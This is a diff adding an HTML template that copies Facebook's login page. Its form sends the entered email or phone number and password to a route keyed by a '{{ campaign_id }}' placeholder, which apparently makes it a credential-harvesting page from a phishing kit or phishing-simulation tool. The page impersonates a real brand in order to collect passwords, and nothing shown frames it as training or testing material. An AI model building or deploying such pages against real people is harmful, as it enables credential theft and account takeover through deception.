@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Log in to Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; width: 980px; justify-content: space-between; align-items: center; }
+        .left { width: 500px; padding-right: 32px; }
+        .left h1 { color: #1877f2; font-size: 56px; margin: 0; }
+        .left p { font-size: 28px; line-height: 32px; color: #1c1e21; }
+        .right { background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
+        .right input { width: 90%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        .right button { width: 95%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; padding: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .right button:hover { background-color: #166fe5; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right">
+            <form action="/login/facebook/{{ campaign_id }}" method="POST">
+                <input type="text" name="username" placeholder="Email address or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
